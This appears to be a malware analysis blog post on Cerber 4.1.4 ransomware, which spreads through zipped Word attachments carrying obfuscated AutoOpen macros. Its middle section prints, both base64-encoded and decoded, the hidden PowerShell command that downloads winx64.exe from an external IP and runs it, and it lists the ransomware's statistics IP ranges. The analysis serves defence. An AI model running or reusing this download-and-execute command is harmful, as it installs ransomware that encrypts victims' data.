
	   
Cerber 4.1.4 is currently being distributed using Word documents with malicious macros that download and install the ransomware. These Word docs are being sent as zipped email attachments in emails with subjects like RE : Invoice 257224.  

Another interesting feature that I have not seen in previous variants, is the use of multiple IP ranges that Cerber will use to send statistics and information about infected victims to the Command & Control servers.


Cerber 4.1.4 Ransom Note

These word documents filenames contain only numbers and would be named similar to 566474170.doc. When you open these documents, current versions of Word will not enable the malicious Macros by default. In order for Cerber to be downloaded and installed, these Macros must be enabled, so the document will contain a message that tries to trick the user into clicking on the Enable Content​ button. 


Malicious Word Document

Once the Enable Content button is clicked, Word will enable macros and the documents AutoOpen() macro will execute. These malicious macros will be obfuscated so that you cannot tell at first glance what they are doing.

Obfuscated Macros

After deobfuscating these macros, you will be left with a PowerShell command that will execute a base64 encoded string as shown below.

POWERSHELL.EXE -window hidden -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwA5ADQALgAxADAAMgAuADUAOAAuADMAMAAvAH4AdAByAGUAdgBvAHIALwB3AGkAbgB4ADYANAAuAGUAeABlACcALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdwBpAG4AeAA2ADQALgBlAHgAZQAiACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdwBpAG4AeAA2ADQALgBlAHgAZQAiACkA


When this base64 string is further decoded, we are left with the easy to read command that will be executed.

POWERSHELL.EXE -window hidden (New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

As you can see, the above command will download a winx64.exe file from a remote site, save it to %AppData%\winx64.exe and then execute it.  As this file is the main Cerber executable, once it is executed it will begin to encrypt the victim's data.

Like previous versions, the encrypted data will append an extension that is based off of the computer's MachineGuid value found in the HKLM\Software\Microsoft\Cryptography registry key. It will also create ransom notes named Readme.hta.

UDP Stats use Multiple IP Ranges

In the previous version I looked at, Cerber only used one ip address range to send statistical information. This version uses three different ranges that it will send UDP statistics packets.  These are 65.55.50.0/27, 192.42.118.0/27, 194.165.16.0/22.
